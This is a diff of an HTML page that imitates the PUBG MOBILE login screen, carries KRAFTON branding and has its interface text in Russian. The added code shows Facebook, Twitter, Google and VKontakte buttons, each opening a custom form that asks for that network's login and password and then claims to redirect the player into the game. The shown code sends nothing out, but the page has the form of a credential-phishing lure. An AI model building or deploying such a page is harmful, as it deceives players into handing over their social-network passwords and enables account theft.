@@ -3,221 +3,220 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE - Вход</title>
-    
-    <!-- Подключаем игровой шрифт Bebas Neue -->
+    <title>PUBG MOBILE - Login</title>
     <link href="fonts.googleapis.com" rel="stylesheet">
-    
     <style>
-        /* Базовые настройки страницы */
-        * {
-            box-sizing: border-box;
-            user-select: none; /* Запрет выделения текста как в игре */
+        :root {
+            --fb-color: #1877f2;
+            --tw-color: #1da1f2;
+            --gp-color: #4285f4;
+            --vk-color: #0077ff;
+            --pubg-gold: #f3ab18;
         }
 
         body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            font-family: 'Bebas Neue', cursive;
-            background-color: #000;
-            overflow: hidden;
+            margin: 0; padding: 0; height: 100%;
+            font-family: 'Roboto', sans-serif;
+            background: #000; overflow: hidden;
             color: white;
         }
 
-        /* Задний фон (Атмосферное изображение 2026 года) */
-        .background-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
+        /* Фоновый слой */
+        .bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: url('w.forfun.com') center/cover no-repeat;
-            transform: scale(1.1); /* Небольшой зум для эффекта глубины */
+            z-index: -1; filter: brightness(0.8);
         }
-
-        /* Затемнение и градиент (как в оригинальном UI) */
         .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0) 0%, rgba(0,0,0,0.8) 100%),
-                        linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 40%);
-            z-index: 0;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
         }
 
-        /* Главный контейнер */
-        .wrapper {
-            position: relative;
-            z-index: 10;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            padding: 60px 20px;
+        /* Главный экран */
+        .main-screen {
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: space-around; height: 100vh; position: relative; z-index: 10;
         }
 
-        /* Номер версии в углу */
-        .version-tag {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            font-family: Arial, sans-serif;
-            font-size: 11px;
-            color: #f3ab18;
-            letter-spacing: 1px;
-            opacity: 0.8;
+        .logo { width: 220px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+
+        .social-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;
+            width: 90%; max-width: 340px;
         }
 
-        /* Логотип по центру */
-        .game-logo {
-            width: 260px;
-            max-width: 80%;
-            filter: drop-shadow(0 0 15px rgba(0,0,0,0.8));
-            animation: fadeInDown 1.2s ease-out;
+        .social-btn {
+            display: flex; align-items: center; justify-content: center;
+            height: 50px; border-radius: 4px; cursor: pointer;
+            transition: 0.2s; border: 1px solid rgba(255,255,255,0.1);
+            font-family: 'Bebas Neue', cursive; font-size: 18px; letter-spacing: 1px;
         }
-
-        /* Блок кнопок входа */
-        .login-section {
-            width: 100%;
-            max-width: 340px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            animation: fadeInUp 1s ease-out;
-        }
-
-        /* Общий стиль игровых кнопок */
-        .btn-auth {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 55px;
-            border-radius: 4px;
-            text-decoration: none;
-            color: #fff;
-            font-size: 22px;
-            letter-spacing: 1.5px;
-            border: 1px solid rgba(255,255,255,0.15);
-            transition: all 0.2s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Иконки внутри кнопок */
-        .btn-auth img {
-            width: 24px;
-            height: 24px;
-            margin-right: 15px;
-        }
-
-        /* Фирменные цвета */
-        .btn-facebook { background-color: #1877f2; }
-        .btn-twitter  { background-color: #1da1f2; }
-        .btn-google   { background-color: #4285f4; }
+        .social-btn:active { transform: scale(0.95); }
+        .social-btn img { width: 22px; margin-right: 10px; }
         
-        /* Кнопка "More" (Прозрачная) */
-        .btn-more {
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255,255,255,0.3);
-            font-size: 18px;
-            height: 45px;
+        .fb { background: var(--fb-color); }
+        .tw { background: var(--tw-color); }
+        .gp { background: var(--gp-color); }
+        .vk { background: var(--vk-color); }
+
+        /* Модальное окно */
+        .modal-back {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: none;
+            align-items: center; justify-content: center; z-index: 100;
         }
 
-        /* Эффект при нажатии */
-        .btn-auth:active {
-            transform: scale(0.96);
-            filter: brightness(0.8);
+        .modal-card {
+            background: #fff; width: 90%; max-width: 380px;
+            border-radius: 8px; color: #333; overflow: hidden;
+            animation: slideUp 0.3s ease-out;
         }
 
-        /* Блик на кнопках */
-        .btn-auth::after {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 50%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transform: skewX(-25deg);
-            transition: 0.5s;
+        .modal-header {
+            padding: 15px; text-align: center; color: white;
+            font-weight: bold; position: relative;
+        }
+        .close-btn {
+            position: absolute; right: 15px; top: 12px; cursor: pointer; font-size: 20px;
         }
 
-        .btn-auth:hover::after {
-            left: 150%;
+        .modal-body { padding: 25px; display: flex; flex-direction: column; }
+        
+        .modal-body h2 { margin: 0 0 10px; font-size: 18px; text-align: center; }
+        .modal-body p { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }
+
+        input {
+            width: 100%; padding: 12px; margin-bottom: 15px;
+            border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;
+            font-size: 16px; outline: none;
+        }
+        input:focus { border-color: var(--pubg-gold); }
+
+        .next-btn {
+            background: var(--pubg-gold); color: #000; border: none;
+            padding: 12px; border-radius: 4px; font-weight: bold;
+            cursor: pointer; font-size: 16px;
         }
 
-        /* Футер с копирайтами */
-        .footer {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            font-size: 10px;
-            color: rgba(255,255,255,0.4);
-            line-height: 1.6;
+        /* Анимации */
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        .footer span {
-            color: rgba(255,255,255,0.6);
-            margin: 0 5px;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        /* Анимации появления */
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Адаптация под мобилки */
-        @media (max-height: 600px) {
-            .game-logo { width: 180px; }
-            .wrapper { padding: 30px 20px; }
-        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="background-container"></div>
-    <div class="overlay"></div>
+<div class="bg"></div>
+<div class="overlay"></div>
 
-    <div class="wrapper">
-        <div class="version-tag">4.2.0.18234 (Global)</div>
-
-        <!-- Логотип -->
-        <img src="upload.wikimedia.org" alt="PUBG Logo" class="game-logo">
-
-        <!-- Секция входа -->
-        <div class="login-section">
-            <a href="#" class="btn-auth btn-google">
-                <img src="cdn-icons-png.flaticon.com" alt="">
-                GOOGLE PLAY
-            </a>
-            <a href="#" class="btn-auth btn-facebook">
-                <img src="cdn-icons-png.flaticon.com" alt="">
-                FACEBOOK
-            </a>
-            <a href="#" class="btn-auth btn-twitter">
-                <img src="cdn-icons-png.flaticon.com" alt="">
-                TWITTER
-            </a>
-            <a href="#" class="btn-auth btn-more">
-                MORE
-            </a>
+<div class="main-screen">
+    <img src="upload.wikimedia.org" class="logo">
+    
+    <div class="social-grid">
+        <div class="social-btn fb" onclick="openLogin('Facebook', '#1877f2')">
+            <img src="cdn-icons-png.flaticon.com"> FACEBOOK
         </div>
-
-        <!-- Информация внизу -->
-        <div class="footer">
-            By logging in, you agree to our <span>Privacy Policy</span> and <span>User Agreement</span>.<br>
-            © 2026 KRAFTON, Inc. & Tencent Games. All rights reserved.
+        <div class="social-btn tw" onclick="openLogin('Twitter', '#1da1f2')">
+            <img src="cdn-icons-png.flaticon.com"> TWITTER
+        </div>
+        <div class="social-btn gp" onclick="openLogin('Google', '#4285f4')">
+            <img src="cdn-icons-png.flaticon.com"> GOOGLE
+        </div>
+        <div class="social-btn vk" onclick="openLogin('VKontakte', '#0077ff')">
+            <img src="cdn-icons-png.flaticon.com"> VKONTAKTE
         </div>
     </div>
+
+    <div style="font-size: 10px; opacity: 0.5;">© 2026 KRAFTON, Inc.</div>
+</div>
+
+<!-- Модальное окно входа -->
+<div id="modal" class="modal-back">
+    <div class="modal-card">
+        <div id="m-header" class="modal-header">
+            <span id="m-title">Login</span>
+            <span class="close-btn" onclick="closeLogin()">×</span>
+        </div>
+        
+        <div class="modal-body">
+            <div id="step-1">
+                <h2 id="input-title">Вход в аккаунт</h2>
+                <p id="input-desc">Введите ваш номер телефона или почту</p>
+                <input type="text" id="login-input" placeholder="Телефон или почта">
+                <button class="next-btn" onclick="goNext()">ДАЛЕЕ</button>
+            </div>
+
+            <div id="step-2" class="hidden">
+                <h2>Введите пароль</h2>
+                <p>Для подтверждения входа в аккаунт</p>
+                <input type="password" id="pass-input" placeholder="Пароль">
+                <button class="next-btn" onclick="finishLogin()">ВОЙТИ</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const modal = document.getElementById('modal');
+    const mHeader = document.getElementById('m-header');
+    const mTitle = document.getElementById('m-title');
+    const step1 = document.getElementById('step-1');
+    const step2 = document.getElementById('step-2');
+    const loginInput = document.getElementById('login-input');
+
+    let currentNetwork = '';
+
+    function openLogin(network, color) {
+        currentNetwork = network;
+        modal.style.display = 'flex';
+        mHeader.style.backgroundColor = color;
+        mTitle.innerText = 'Вход через ' + network;
+        
+        // Кастомизация под соцсеть
+        if(network === 'Facebook') {
+            loginInput.placeholder = 'Электронный адрес или номер';
+        } else if(network === 'VKontakte') {
+            loginInput.placeholder = 'Телефон или почта VK';
+        } else {
+            loginInput.placeholder = 'Email или ID';
+        }
+    }
+
+    function closeLogin() {
+        modal.style.display = 'none';
+        step1.classList.remove('hidden');
+        step2.classList.add('hidden');
+        loginInput.value = '';
+        document.getElementById('pass-input').value = '';
+    }
+
+    function goNext() {
+        if(loginInput.value.length < 3) {
+            alert('Введите корректные данные');
+            return;
+        }
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+    }
+
+    function finishLogin() {
+        const pass = document.getElementById('pass-input').value;
+        if(pass.length < 4) {
+            alert('Введите пароль');
+            return;
+        }
+        alert('Данные приняты. Перенаправление в игру...');
+        closeLogin();
+    }
+
+    // Закрытие при клике вне окна
+    window.onclick = function(event) {
+        if (event.target == modal) closeLogin();
+    }
+</script>
 
 </body>
 </html>
